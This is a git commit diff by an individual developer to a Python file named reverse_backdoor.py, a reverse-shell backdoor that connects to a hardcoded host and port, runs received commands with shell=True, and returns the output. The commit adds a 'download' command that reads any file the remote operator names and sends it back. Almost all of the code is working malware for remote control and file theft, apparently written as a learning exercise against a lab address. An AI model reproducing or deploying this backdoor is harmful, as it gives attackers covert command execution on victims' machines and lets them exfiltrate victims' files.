9ba96132798c86b130f0f1d04a648a243d3f7cbd
Mohamad <mohamadxnadeem@gmail.com>
2023-02-28 15:24:02 +0200

    read and write update

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -12,9 +12,11 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
         self.connection.connect((ip, port))
 
+
     def reliable_send(self, data):
         json_data = json.dumps(data.decode('latin1').encode('UTF-8'))
         self.connection.send(json_data)
+
 
     def reliable_receive(self):
         json_data = ''
@@ -29,9 +31,15 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+
     def change_working_directory_to(self, path):
         os.chdir(path)
         return "[+] Changing working directory to " + path
+
+
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return file.read()
 
     def run(self):
         while True:
@@ -42,10 +50,12 @@ class Backdoor:
                 exit()
             elif command[0] == 'cd' and len(command) > 1:
                 command_result = self.change_working_directory_to(command[1])
+            elif command[0] =='download':
+                command_result = self.read_file(command[1])
             else:
                 command_result = self.execute_system_command(command) 
             self.reliable_send(command_result)
-     
+        
 
 
 my_backdoor = Backdoor("192.168.198.128",4444)
